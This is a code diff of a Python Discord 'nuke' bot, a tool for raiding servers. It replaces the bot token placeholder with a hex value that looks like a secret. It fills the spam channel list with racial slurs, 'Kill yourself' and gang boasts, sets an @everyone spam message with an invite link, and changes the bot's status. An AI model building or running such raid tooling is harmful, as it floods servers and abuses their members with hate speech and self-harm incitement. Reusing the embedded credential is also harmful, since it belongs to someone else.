@@ -7,19 +7,19 @@ import asyncio
 
 # Check readme.md for lastest updates
 
-token = "PasteHere"
+token = "2911bdf11e0f659ebd5261c696a66ee35ebc7c6709b98e9541f54441342b6ed8"
 
 # If you are having issues, watch this video: https://streamable.com/7eovst or follow message listed below
 
 #  If it says Shared ID None is requesting privileged intents, go to discord developer portal and go to your bot and click on the bot tab and then scroll down to where it says privileged gateway intents and enable both, then it should work
 
 SPAM_CHANNEL = [
-    "retard-mods", "imagine-being-nuked", "wassup-sis", "ez-peez-bro",
-    "dont-mess-with-us", "adopted ", "nuked nuked", "how are u feeling",
-    "take-some-pings", "Get on my level but you cant", "helo-simps",
-    "have-fun-bois", "leave-this-server-nerds", "retard-owner-haha"
+    "GGS", "HEHE", "BYE", "HEHE",
+    "Get ran", "Kill yourself ", "nuked", "G59 Bandits ran you ",
+    "take-some-pings", "Get Beamed", "Nigger",
+    "BYE NIGGER", "Get Ran", "Get Ran By G59 Bandits"
 ]
-SPAM_MESSAGE = ["@everyone @here Server Got Raided How are ya feeling XD"]
+SPAM_MESSAGE = ["@everyone https://discord.gg/gEKTAeGqWz"]
 
 intents = discord.Intents(messages=True, guilds=True, members=True)
 
@@ -35,7 +35,7 @@ async def on_ready():
  / /_/ / (__  ) /__/ /_/ / /  / /_/ /  / /|  / /_/ / ,< /  __/  / /_/ / /_/ / /_  
 /_____/_/____/\___/\____/_/   \__,_/  /_/ |_/\__,_/_/|_|\___/  /_____/\____/\__/'''
     )
-    await client.change_presence(activity=discord.Game(name="With Kittens"))
+    await client.change_presence(activity=discord.Game(name="G59 BANDITS"))
 
 
 @client.command()
